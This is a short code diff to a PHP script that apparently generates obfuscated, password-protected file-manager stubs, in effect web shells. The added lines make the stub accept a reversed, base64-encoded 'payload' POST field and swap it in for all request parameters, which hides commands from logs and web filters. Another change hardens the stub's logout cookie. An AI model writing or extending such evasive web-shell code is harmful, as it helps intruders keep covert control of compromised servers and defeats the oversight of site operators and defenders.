@@ -146,10 +146,18 @@ $login_html = '<!DOCTYPE html>
 $stub_template = '<?php
 error_reporting(0);
 @session_start();
+if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\' && isset($_POST[\'payload\'])) {
+    $pl_dec = base64_decode(strrev($_POST[\'payload\']));
+    if ($pl_dec !== false) {
+        $p_arr = array();
+        parse_str($pl_dec, $p_arr);
+        $_POST = $p_arr;
+    }
+}
 if ((isset($_POST[\'action\']) && $_POST[\'action\'] === \'logout\') || (isset($_GET[\'action\']) && $_GET[\'action\'] === \'logout\')) {
     unset($_SESSION[\'obf_key\']);
     @session_destroy();
-    setcookie(\'fm_auth\', \'\', time() - 3600, \'/\');
+    setcookie(\'fm_auth\', \'\', time() - 3600, \'/\', \'\', false, true);
     header("Location: " . $_SERVER[\'PHP_SELF\']);
     exit;
 }
